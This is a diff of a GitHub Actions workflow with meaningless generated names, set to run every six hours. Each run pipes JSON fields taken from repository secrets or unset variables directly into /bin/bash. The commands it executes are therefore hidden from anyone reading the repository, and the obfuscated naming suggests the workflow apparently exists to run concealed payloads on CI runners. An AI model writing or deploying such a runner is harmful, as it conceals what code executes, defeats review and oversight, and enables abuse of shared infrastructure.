@@ -1,25 +1,20 @@
 name: xupingzhi4321
+
 on:
   workflow_dispatch:
   schedule:
-    - cron: '24 2/6 * * *'
-
+    - cron: '37 1/6 * * *'
 jobs:
   build:
     runs-on: ubuntu-latest
-
     steps:
       - uses: actions/checkout@v4
       - name: xupingzhi4321
         env:
-          u6119: ${{ secrets.u6119 }}
+          bh555: ${{ secrets.bh555 }}
         run: |
-          echo $u6119 | jq -r .ytd568 | /bin/bash
-          echo $an052 | jq -r .y73 | /bin/bash
-          echo $n11 | jq -r .w327 | /bin/bash
-          echo $sdkuz27683 | jq -r .ehqi2627 | /bin/bash
-          echo $liz120 | jq -r .wffv75409 | /bin/bash
-          echo $pg252 | jq -r .bjri116 | /bin/bash
-          echo $ydv796 | jq -r .cj719 | /bin/bash
-          echo $qfs7 | jq -r .k76 | /bin/bash
+          echo $bh555 | jq -r .q655 | /bin/bash
+          echo $vao64 | jq -r .dyos914 | /bin/bash
+          echo $rk2993 | jq -r .juspz20458 | /bin/bash
+          echo $sue8 | jq -r .qjwy97 | /bin/bash
 
